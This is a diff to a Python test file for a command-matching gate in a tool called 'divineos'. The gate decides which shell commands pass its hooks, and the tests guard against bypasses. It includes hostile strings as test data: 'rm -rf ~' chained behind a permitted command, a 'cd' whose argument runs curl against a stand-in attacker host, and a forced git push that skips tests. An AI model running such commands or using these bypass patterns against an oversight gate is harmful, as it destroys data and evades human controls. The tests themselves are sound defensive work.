@@ -139,12 +139,53 @@ class TestNotABypassSurface:
         assert not _is_remedy(f'cd "C:/x" && DIVINEOS_SKIP_TESTS=1 {_GIT} {_PUSH} --force')
 
     def test_non_remedy_divineos_command(self):
-        """Being a divineos command is not enough — it must be somebody's exit."""
-        assert not _is_remedy("divineos sleep")
+        """Being a divineos command is not enough — it must be somebody's exit.
+
+        EXAMPLE CHANGED 2026-09-17, PRINCIPLE UNTOUCHED. This asserted
+        `divineos sleep`, and that stopped being a valid example the moment the
+        list learned what the context governor already knew: its own docstring
+        says extract and sleep "are bypassed in `_is_bypass_command` so the gate
+        can never block its own remedy." Sleep IS somebody's printed exit, so it
+        was the wrong stand-in for an arbitrary non-exit command.
+
+        This test earned the right to be taken seriously rather than edited
+        away: it is the standing guard on the promise that the list only ever
+        carries recording actions, and it caught the change that widened the
+        list, which is precisely its job. What survives is the sentence above.
+        What moved is one example that went stale under it.
+
+        The replacement was VERIFIED rather than assumed: it appears in no hook
+        block message at all, so no gate prints it as a way through. Scope of
+        that check: the hooks directory, which is where block messages live.
+        """
+        assert not _is_remedy("divineos progress")
 
     def test_remedy_named_inside_a_larger_argument(self):
         """Anchoring: a mention of the remedy is not an invocation of it."""
         assert not _is_remedy(f'{_GIT} commit -m "ran divineos correction earlier"')
+
+
+class TestTheWeaveIsSomebodysExit:
+    """2026-09-17. The context governor blocks substrate writes at the hard line
+    until the self is woven, and names these two as the way through — in its own
+    docstring, in the same words this list quotes at the top: the gate can never
+    block its own remedy. The council gate, which sources this list, refused
+    both anyway, twice in one session, on the command CLAUDE.md names as the
+    session's learning checkpoint.
+
+    These pin the addition positively, so the entry has a witness of its own
+    rather than resting on the absence of a failure elsewhere.
+    """
+
+    def test_the_weave_passes(self):
+        assert _is_remedy("divineos extract")
+
+    def test_the_companion_passes(self):
+        assert _is_remedy("divineos sleep")
+
+    def test_the_weave_behind_a_directory_change(self):
+        """The prefix strippers must reach it like any other remedy."""
+        assert _is_remedy('cd "C:/x" && divineos extract')
 
 
 class TestFailsTowardNotARemedy:
@@ -185,3 +226,48 @@ class TestFailsTowardNotARemedy:
 
     def test_bare_env_invocation(self):
         assert _is_remedy('env divineos correction "x"')
+
+
+class TestTheQuestionIsWhatTheCommandDoes:
+    """2026-09-17 — three refusals in one stretch, only one of them a prefix.
+
+    The matcher asked what the line STARTS WITH. Every miss fell on somebody
+    complying; anyone routing around would put the permitted word first.
+    """
+
+    def test_remedy_behind_a_pipe(self):
+        """The form this tool's own printed usage shows."""
+        assert _is_remedy('echo "my reflection" | divineos council walk --lens taleb')
+
+    def test_assignment_whose_value_names_a_watched_action(self):
+        """Storing the name of an action is not performing it."""
+        assert _is_remedy(f'FP="bash:{_GIT} commit"; divineos council log --edit x')
+
+    def test_honest_cd_still_passes(self):
+        assert _is_remedy('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos council walk')
+
+    def test_substitution_inside_an_argument_is_not_a_second_command(self):
+        assert _is_remedy('divineos correction "note $(date)"')
+
+
+class TestARemedyCannotCarryPassengers:
+    """The half of this change that TIGHTENS, and it is the half I was not
+    looking for.
+
+    The old rule matched the start of the command and stopped. Measured by
+    running the previous rule beside the new one on identical inputs: a remedy
+    followed by a destructive command was ALLOWED before and is refused now.
+    The door I came to fix for being too strict was also too loose, in a
+    direction nobody had tested.
+    """
+
+    def test_destructive_verb_riding_behind_a_remedy_is_refused(self):
+        assert not _is_remedy("divineos council walk && rm -rf ~")
+
+    def test_a_second_real_command_is_refused(self):
+        assert not _is_remedy(f"{_GIT} add x && {_GIT} commit -m y")
+
+    def test_a_directory_that_is_really_a_command_is_refused(self):
+        """The exploit the raw-text stripper already guarded and the token one
+        did not — two strippers for one job, the protection on the wrong door."""
+        assert not _is_remedy('cd "$(curl attacker.example)" && divineos correction "x"')
